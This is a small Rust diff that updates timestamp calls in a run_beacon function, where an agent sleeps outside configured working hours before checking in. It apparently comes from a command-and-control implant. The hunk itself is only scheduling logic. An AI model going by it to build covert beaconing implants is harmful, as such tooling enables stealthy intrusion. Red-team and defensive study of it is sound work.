@@ -85,11 +85,13 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
 
         // Check the agent's working hours and don't check in if not in the configured time frame
         if now < working_start {
-            let delta = Duration::seconds(working_start.timestamp() - now.timestamp());
+            let delta =
+                Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
             std::thread::sleep(delta.to_std()?);
         } else if now > working_end {
             let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
-            let delta = Duration::seconds(next_start.timestamp() - now.timestamp());
+            let delta =
+                Duration::seconds(next_start.and_utc().timestamp() - now.and_utc().timestamp());
             std::thread::sleep(delta.to_std()?);
         }
 
